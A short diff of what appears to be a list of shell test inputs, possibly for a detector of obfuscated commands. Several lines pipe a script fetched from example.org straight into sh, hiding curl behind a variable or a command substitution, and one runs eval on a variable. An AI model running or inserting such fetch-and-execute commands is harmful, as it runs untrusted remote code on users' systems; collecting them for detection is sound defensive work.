@@ -1,4 +1,4 @@
-c=curl; $c https://example.org/i.sh | sh
+$c https://example.org/i.sh | sh
 $(echo curl) https://example.org/i.sh | sh
 eval "$x"
 $HOME/bin/tool | sh
